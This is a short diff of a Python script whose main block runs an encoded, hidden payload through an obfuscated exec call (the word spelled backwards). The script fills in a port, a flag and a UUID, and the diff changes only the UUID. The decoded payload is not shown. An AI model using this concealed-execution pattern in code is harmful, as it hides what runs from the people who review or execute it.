@@ -5,7 +5,7 @@ if __name__ == "__main__":
     getattr(__builtins__, "cexe"[::-1])(
         de(key).decode("utf8").replace(str(int("0x1f90", 16)), str(8080))
         .replace("fc_", "False")
-        .replace("iu_", "271746bb-7ad0-4ba1-8799-d9bb9de21e73")
+        .replace("iu_", "25321084-769c-456e-be7b-7e91cbce65e7")
         .replace("lv_", "")
         .replace("mv_", "")
         .replace("rt_", ""))
